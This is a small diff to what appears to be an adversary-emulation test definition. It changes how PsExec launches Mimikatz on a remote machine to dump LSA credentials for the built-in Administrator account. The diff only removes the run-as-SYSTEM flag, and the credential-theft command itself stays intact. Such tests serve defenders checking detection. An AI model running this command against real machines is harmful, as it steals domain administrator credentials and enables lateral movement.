@@ -108,6 +108,6 @@ atomic_tests:
       Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
   executor:
     command: |
-      #{psexec_path} /accepteula \\#{machine} -s -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
+      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
     name: command_prompt
     elevation_required: false # locally not, but remotely on target machine then yes
